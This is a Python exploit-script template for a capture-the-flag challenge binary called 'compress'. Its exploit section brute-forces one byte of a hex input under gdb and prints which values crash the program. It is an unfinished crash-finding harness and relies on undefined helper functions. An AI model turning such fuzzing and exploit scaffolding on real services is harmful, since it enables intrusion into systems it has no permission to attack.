#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./compress')

host = args.HOST or 'compression.2021.ctfcompetition.com'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
TINY = "54494e59ff1bd27d5e"
TINY = "54494e5xxf1bd27d5e"
context.log_level = 'warn'
# while True:
for i in range(0xff+1):
    io = auto_gdb("compress")
    rand_bytes = get_rand_bytes(5)
    fuck = TINY.replace("xx", str(hex(i))[2:])
    gdb_cmd("r")
    re()
    sl("2")
    re()
    sl(fuck)
    mf = rl()
    gdb_cmd("x/i $rip")
    kek = rl()
    if b"No registers." in kek:
        print(f"FAILED : {fuck}")
        print(mf)
    else:
        print(kek)
        print(f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA : {fuck}")
    io.close()
